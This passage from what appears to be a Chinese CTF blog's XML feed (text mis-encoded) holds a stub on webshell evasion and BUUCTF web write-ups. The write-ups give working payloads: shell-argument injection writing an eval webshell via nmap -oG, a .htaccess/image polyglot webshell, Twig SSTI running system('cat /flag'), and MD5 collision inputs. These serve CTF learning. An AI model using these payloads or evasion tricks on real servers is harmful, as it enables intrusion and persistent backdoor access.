‡é¶æœºå¾—åˆ°ï¼š</p><p>flag{bd2f6a1d5242c962a05619c56fa47ba6}</p><p>theflash(é—ªç”µä¾ )</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶æœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœ¨é©¬å…æ€</title>
      <link href="/2021/06/16/webshell-mian-sha/"/>
      <url>/2021/06/16/webshell-mian-sha/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>æ­¤ç¯‡é’ˆå¯¹webshellçš„å…æ€è¿›è¡Œä¸€ç³»åˆ—çš„ç ”ç©¶åˆ†äº«(æŒç»­æ›´æ–°)</p><h2 id="Bypassæ€è·¯ï¼š"><a href="#Bypassæ€è·¯ï¼š" class="headerlink" title="Bypassæ€è·¯ï¼š"></a>Bypassæ€è·¯ï¼š</h2><h3 id="1-é™æ€å…æ€"><a href="#1-é™æ€å…æ€" class="headerlink" title="1.é™æ€å…æ€"></a>1.é™æ€å…æ€</h3><p>å…¶ä¸»è¦æ˜¯æ ¹æ®å¯¹ä½ ä¸Šä¼ çš„ä¸œè¥¿è¿›è¡Œç®€å•çš„æ‰«æï¼Œä¾‹å¦‚Dç›¾ï¼Œæƒ³è¦ç»•è¿‡è¿™ç§å…æ€ï¼ŒåŸºæœ¬å°±æ˜¯å°†å…³é”®å­—è¿›è¡Œä¸€ä¸ªéšè—å°±å¯ä»¥äº†</p><h4 id="1-1ç”±ä¸€é“é¢˜ç›®å¼•å‘çš„å…æ€æ€è·¯ï¼š-CISCN-2019-åˆèµ›-Love-Math"><a href="#1-1ç”±ä¸€é“é¢˜ç›®å¼•å‘çš„å…æ€æ€è·¯ï¼š-CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="1.1ç”±ä¸€é“é¢˜ç›®å¼•å‘çš„å…æ€æ€è·¯ï¼š[CISCN 2019 åˆèµ›]Love Math"></a>1.1ç”±ä¸€é“é¢˜ç›®å¼•å‘çš„å…æ€æ€è·¯ï¼š[CISCN 2019 åˆèµ›]Love Math</h4><p>æ­¤é¢˜ç›®ä¸­åˆ©ç”¨äº†ç™½åå•ï¼Œé»‘åå•æ¥å®ç°é™æ€æ£€æµ‹ï¼Œä½†æ˜¯ç”±äºå¯ä»¥getåˆ°æºç ï¼ŒåŒæ—¶åˆæ˜¯ä¸€é“ctfé¢˜ç›®æ‰€ä»¥å¯ä»¥getåˆ°åŸºæœ¬è€ƒç‚¹</p><p>ä¸»è¦å‡½æ•°åˆ©ç”¨ï¼š</p><p>base_convert() å‡½æ•°ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ã€‚<br>dechex() å‡½æ•°ï¼šæŠŠåè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ã€‚<br>hex2bin() å‡½æ•°ï¼šæŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚</p><p>è¿™ä¸‰ä¸ªå‡½æ•°çš„ç»“åˆå°±å¯ä»¥å®ç°ä»»æ„å­—ç¬¦çš„è½¬æ¢ï¼Œè¿™å°±æ˜¯æˆ‘è¦è¯´çš„å…æ€çš„ç¬¬ä¸€ä¸ªæ€è·¯ï¼šåˆ©ç”¨ç¼–ç æœºåˆ¶æ¥å®ç°bypass</p><p>åŸæ¥çš„æ ·å­ï¼š</p><pre><code>$_GET[a]($_GET[b]);</code></pre><h3 id="2-åŠ¨æ€å…æ€"><a href="#2-åŠ¨æ€å…æ€" class="headerlink" title="2.åŠ¨æ€å…æ€"></a>2.åŠ¨æ€å…æ€</h3><p>æ ¹æ®ä½ ä¸æœåŠ¡ç«¯äº¤äº’çš„æµé‡è¿›è¡Œåˆ†æï¼Œç›®å‰çš„å¤§éƒ¨åˆ†waféƒ½å…·æœ‰æ­¤åŠŸèƒ½ï¼Œå…¶åŠŸèƒ½å°±åƒwiresharkçš„åŸç†ä¸€æ ·</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctfä¹‹Web(äºŒ)</title>
      <link href="/2021/05/23/buuctf-zhi-web-er/"/>
      <url>/2021/05/23/buuctf-zhi-web-er/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1846317550&auto=1&height=66"></iframe><h1 id="2021-5-23"><a href="#2021-5-23" class="headerlink" title="2021-5-23"></a>2021-5-23</h1><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><h3 id="é¢˜ç›®ï¼š"><a href="#é¢˜ç›®ï¼š" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h3><pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"glzjin"</span><span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token string">'you are in sandbox '</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>     @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¡¥å……çŸ¥è¯†ï¼š"><a href="#è¡¥å……çŸ¥è¯†ï¼š" class="headerlink" title="è¡¥å……çŸ¥è¯†ï¼š"></a>è¡¥å……çŸ¥è¯†ï¼š</h3><h4 id="escapeshellargå‡½æ•°ï¼š"><a href="#escapeshellargå‡½æ•°ï¼š" class="headerlink" title="escapeshellargå‡½æ•°ï¼š"></a>escapeshellargå‡½æ•°ï¼š</h4><p>(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7, PHP 8)</p><p>escapeshellarg â€” æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°ï¼›</p><p><strong>escapeshellarg()</strong> å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å« <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a>, <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">æ‰§è¡Œè¿ç®—ç¬¦</a> ã€‚</p><p>ä¾‹å­ï¼š</p><pre><code> &lt;?php system(&#39;ls &#39;.escapeshellarg($dir)); ?&gt;</code></pre><h3 id="escapeshellcmdå‡½æ•°ï¼š"><a href="#escapeshellcmdå‡½æ•°ï¼š" class="headerlink" title="escapeshellcmdå‡½æ•°ï¼š"></a>escapeshellcmdå‡½æ•°ï¼š</h3><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p><p>escapeshellcmd â€” shell å…ƒå­—ç¬¦è½¬ä¹‰</p><p><strong>escapeshellcmd()</strong> å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a> æˆ– <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> å‡½æ•°ï¼Œæˆ–è€… <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">æ‰§è¡Œæ“ä½œç¬¦</a> ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚</p><p>åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`,<code>\x0A</code>å’Œ<code>\xFF</code>ã€‚<code>&#39;</code>å’Œ<code>&quot;</code>ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ%`å’Œ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</p><h4 id="åˆ©ç”¨-ç»•è¿‡-PHP-escapeshellarg-escapeshellcmdå‡½æ•°ï¼š"><a href="#åˆ©ç”¨-ç»•è¿‡-PHP-escapeshellarg-escapeshellcmdå‡½æ•°ï¼š" class="headerlink" title="åˆ©ç”¨/ç»•è¿‡ PHP escapeshellarg/escapeshellcmdå‡½æ•°ï¼š"></a><a href="https://zhuanlan.zhihu.com/p/36602107" target="_blank" rel="noopener">åˆ©ç”¨/ç»•è¿‡ PHP escapeshellarg/escapeshellcmdå‡½æ•°ï¼š</a></h4><p>escapeshellargå’Œescapeshellcmdçš„åŠŸèƒ½ escapeshellarg 1.ç¡®ä¿ç”¨æˆ·åªä¼ é€’ä¸€ä¸ªå‚æ•°ç»™å‘½ä»¤ 2.ç”¨æˆ·ä¸èƒ½æŒ‡å®šæ›´å¤šçš„å‚æ•°ä¸€ä¸ª 3.ç”¨æˆ·ä¸èƒ½æ‰§è¡Œä¸åŒçš„å‘½ä»¤</p><p>escapeshellcmd 1.ç¡®ä¿ç”¨æˆ·åªæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ 2.ç”¨æˆ·å¯ä»¥æŒ‡å®šä¸é™æ•°é‡çš„å‚æ•° 3.ç”¨æˆ·ä¸èƒ½æ‰§è¡Œä¸åŒçš„å‘½ä»¤</p><h4 id="chdir-å‡½æ•°ï¼š"><a href="#chdir-å‡½æ•°ï¼š" class="headerlink" title="chdir()å‡½æ•°ï¼š"></a>chdir()å‡½æ•°ï¼š</h4><p>æ–°å»ºä¸€ä¸ªç›®å½•</p><h3 id="è§£é¢˜ï¼š"><a href="#è§£é¢˜ï¼š" class="headerlink" title="è§£é¢˜ï¼š"></a>è§£é¢˜ï¼š</h3><p>é¦–å…ˆè¯·æ±‚å¤´é‡Œé¢è¦æœ‰X_FORWARDED_FORï¼Œæœ‰çš„è¯ä¼šè¢«å˜æˆREMOTE_ADDR</p><p>getä¼ å…¥å‚æ•°hostï¼Œè¿™é‡Œç”¨è¯¥å°±æ˜¯ä¼ å…¥ip</p><p>çœ‹äº†çœ‹<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡</a>(ä¸€ä¸ªå¾ˆå¼ºçš„æŠ€æœ¯ç«™ç‚¹)</p><p>ç„¶åé…åˆè¿™ç¯‡æ–‡ç« æ‰èƒ½å®Œå…¨ç†è§£å“ˆï¼š</p><p><a href="http://www.lmxspace.com/2018/07/16/è°ˆè°ˆescapeshellargå‚æ•°ç»•è¿‡å’Œæ³¨å…¥çš„é—®é¢˜/" target="_blank" rel="noopener">è°ˆè°ˆescapeshellargå‚æ•°ç»•è¿‡å’Œæ³¨å…¥çš„é—®é¢˜ (lmxspace.com)</a></p><p>è¿™æ—¶å€™æœç´¢å¯ä»¥å‘ç°åœ¨nmapå‘½ä»¤ä¸­ æœ‰ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶</p><p>è¿™ä¸ªå‘½ä»¤å°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥å¯æ§ï¼ç„¶åå†™å…¥åˆ°æ–‡ä»¶ï¼OKå¾ˆè‡ªç„¶çš„æƒ³åˆ°äº†ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬äº†,æˆ–è€…ç›´æ¥æŸ¥çœ‹flag</p><pre><code>?host=&#39;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;</code></pre><p>æ³¨æ„è¿™é‡Œçš„aéœ€è¦ç”¨åŒå¼•å·æ¥åŒ…è£¹èµ·æ¥</p><p>æ‰§è¡Œåä¼šè¿”å›æ–‡ä»¶å¤¹å</p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>è€ƒæŸ¥ç‚¹ä¸º.htaccess</p><pre><code>&lt;FilesMatch &quot;a.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>a.jpgä¸ºå‡†å¤‡çš„å›¾ç‰‡</p><p>1.phpï¼š</p><pre><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;/script&gt;</code></pre><p>åœ¨å‘½ä»¤è¡Œé‡Œé¢åˆ¶ä½œä¸€å¥è¯æœ¨é©¬</p><pre><code>copy a.jpg/b + 1.php/a h</code></pre><h2 id="å¼ºç½‘æ¯-2019-Web-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-Web-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="å¼ºç½‘æ¯-2019-Web-é«˜æ˜çš„é»‘å®¢"></a>å¼ºç½‘æ¯-2019-Web-é«˜æ˜çš„é»‘å®¢</h2><p>ç»™äº†ä¸€å¤§å †phpåé—¨æ–‡ä»¶ï¼Œè¦ç”¨è„šæœ¬å»è·‘å¯ä»¥ç”¨çš„æ–‡ä»¶</p><p>æœ¨é©¬ï¼šxk0SzyKwfzw.php?Efa5BVG=cat /flag</p><p>Efa5BVG</p><h1 id="2021-5-26"><a href="#2021-5-26" class="headerlink" title="2021-5-26"></a>2021-5-26</h1><h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>å°†urlä¸­imgå‚æ•°base64è§£ç 2æ¬¡åhexè§£ç ä¸€æ¬¡ï¼Œå¾—åˆ°5.png</p><p>åŒç†å¾—åˆ°index.phpæºç ï¼Œå°†å¾—åˆ°base64å¯†æ–‡è§£ç ï¼Œå¾—åˆ°å¦‚ä¸‹(å·²å°†å¤šä½™çš„ä»£ç åˆ é™¤äº†)ï¼š</p><pre class="line-numbers language-php+html"><code class="language-php+html"><?php$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd']))     header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);if (preg_match("/flag/i", $file)) {    echo '<img src ="./ctf3.jpeg">';    die("xixiï½ no flag");} else {    $txt = base64_encode(file_get_contents($file));    echo "<img src='data:image/gif;base64," . $txt . "'></img>";    echo "<br>";}echo $cmd;echo "<br>";if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {    echo("forbid ~");    echo "<br>";} else {    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {        echo `$cmd`;    } else {        echo ("md5 is funny ~");    }}?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸»è¦è€ƒç‚¹ï¼š</p><p>å› ä¸ºè¿™æ˜¯<a href="https://www.cnblogs.com/hacker-snail/p/13955722.html" target="_blank" rel="noopener">md5å¼ºç¢°æ’</a>æ‰€ä»¥æ•°ç»„æ˜¯æ— æ³•ç»•è¿‡çš„ï¼Œå¯¹äºéœ€è¦ä¸¤ä¸ªå†…å®¹ä¸åŒä½†æ˜¯MD5å€¼ç›¸åŒçš„æ–‡ä»¶ï¼Œä½¿ç”¨Fastcollå°±å¯ä»¥äº†</p><p><a href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162202082216780264012739%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162202082216780264012739&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-108837347.first_rank_v2_pc_rank_v29&utm_term=md5%E5%BC%BA%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83&spm=1018.2226.3001.4187" target="_blank" rel="noopener">æ€»ç»“ctfä¸­ MD5 ç»•è¿‡çš„ä¸€äº›æ€è·¯</a></p><pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>æ³¨æ„ç‚¹ï¼š</p><p>éœ€è¦ç”¨ç«ç‹æ¥è¿›è¡Œpostçš„æ•°æ®ä¼ å‚æ•°ï¼Œç„¶åæ¥æŠ“åŒ…ï¼Œå¹¶ä¸”ä¿®æ”¹postä¼ å‡ºçš„æ•°æ®ï¼Œç„¶ååˆ©ç”¨sortå‘½ä»¤æ¥ç»•è¿‡catçš„è¿‡æ»¤</p><h1 id="2021-5-27-SSTIå­¦ä¹ "><a href="#2021-5-27-SSTIå­¦ä¹ " class="headerlink" title="2021-5-27(SSTIå­¦ä¹ )"></a>2021-5-27(<a href="https://www.cnblogs.com/cioi/p/12308518.html" target="_blank" rel="noopener">SSTIå­¦ä¹ </a>)</h1><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>é’ˆå¯¹<a href="https://blog.csdn.net/weixin_44604541/article/details/109048578" target="_blank" rel="noopener">sstiæ¨¡æ¿</a>æ³¨å…¥ï¼Œå¯¼è‡´æ­¤ç±»é—®é¢˜è¢«åˆ©ç”¨ä¸»è¦æ˜¯ç¨‹åºå‘˜å¯¹ä»£ç çš„ä¸ä¸¥è°¨æ²¡å¯¼è‡´æ³¨å…¥ç‚¹çš„æš´éœ²ï¼Œä½¿æ”»å‡»è€…åˆ©ç”¨æ¨¡æ¿å¼•æ“æ¥å®ç°æ”»å‡»</p><p>ä¸»è¦çš„æ¡†æ¶</p><ul><li>Pythonï¼šjinja2ã€ makoã€ tornadoã€ django</li><li>phpï¼šsmartyã€ twig</li><li>javaï¼šjadeã€ velocity</li></ul><p>è€Œæ­¤é¢˜çš„æ³¨å…¥ç‚¹å­˜åœ¨äºå†³å®šäºipçš„xffä¸­</p><p>è€Œè¿™é‡Œçš„æ¨¡æ¿å¼•æ“ä¸ºtwig(åˆ©ç”¨7*7æ¥åˆ¤æ–­)</p><p>æ‰€ä»¥åˆ©ç”¨systemå‡½æ•°è¿›è¡Œshellçš„äº¤äº’æ“ä½œ</p><p>åœ¨è¯·æ±‚å¤´æ„é€ xff:</p><pre><code>{{system("ls")}}{{system("cat /flag")}}</code></pre><p>å³å¯å¾—åˆ°flag</p><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p>åˆ©ç”¨tplmapæ¥å®ç°sstiæ¨¡æ¿æ³¨å…¥</p><p><a href="https://www.cnblogs.com/LEOGG321/p/13441283.html" target="_blank" rel="noopener">è®°ä¸€æ¬¡tplmapçš„ç®€å•ä½¿ç”¨æ¡ˆä¾‹</a></p><p><a href="https://blog.csdn.net/EC_Carrot/article/details/109709767" target="_blank" rel="noopener">Tplmapçš„å®‰è£…ä¸ç”¨æ³•ï¼ˆå†…åŒ…å«è§£å†³ç¼ºå°‘åº“æŠ¥é”™çš„å¤„ç†æ•™ç¨‹)</a></p><h1 id="2021-05-29-30"><a href="#2021-05-29-30" class="headerlink" title="2021-05-29/30"></a>2021-05-29/30</h1><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a><a href="https://blog.csdn.net/weixin_43818995/article/details/105172871" target="_blank" rel="noopener">[BJDCTF2020]Mark loves cat</a></h2><p>.gitæ³„éœ²ï¼š<a href="https://blog.csdn.net/qq1045553189/article/details/86221203" target="_blank" rel="noopener">dirsearchæ‰«æ</a>éƒ½æ˜¯æ¨èä½çº¿ç¨‹å“ˆ-s 1ï¼Œç„¶ågithackä¸‹è½½æºç </p><p>index.phpæºç æ³„éœ²ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$yds</span> <span class="token operator">=</span> <span class="token string">"dog"</span><span class="token punctuation">;</span><span class="token variable">$is</span> <span class="token operator">=</span> <span class="token string">"cat"</span><span class="token punctuation">;</span><span class="token variable">$handsome</span> <span class="token operator">=</span> <span class="token string">'yds'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token shell-comment comment">#postå‡ºå…¥å‚æ•°ï¼š?test=123å°†è¿™ç§æ ¼å¼</span>    $<span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$y</span><span class="token punctuation">;</span> <span class="token shell-comment comment">#è‹¥ä¼ å…¥x=yï¼Œåˆ™$x=y</span>    <span class="token variable">$test</span><span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $<span class="token variable">$x</span> <span class="token operator">=</span> $<span class="token variable">$y</span><span class="token punctuation">;</span>   <span class="token shell-comment comment">#è‹¥ä¼ å…¥x=yï¼Œåˆ™$x=$y</span>    <span class="token variable">$test</span><span class="token operator">=</span><span class="token variable">$123</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$x</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$handsome</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//éå†ä¼ å…¥çš„getå‚æ•°ï¼Œå½“å‚æ•°çš„keyåä¸æ˜¯flagï¼Œä¸”keyåä¸ºflagçš„valueåˆè¦ç­‰äºå½“å‰çš„keyï¼Œå³å½“å­˜åœ¨key!='flag',è€Œflag=key</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$yds</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#æ²¡æœ‰è®¾ç½®flagåˆ™è¿›å…¥</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'flag'</span>  <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$is</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment 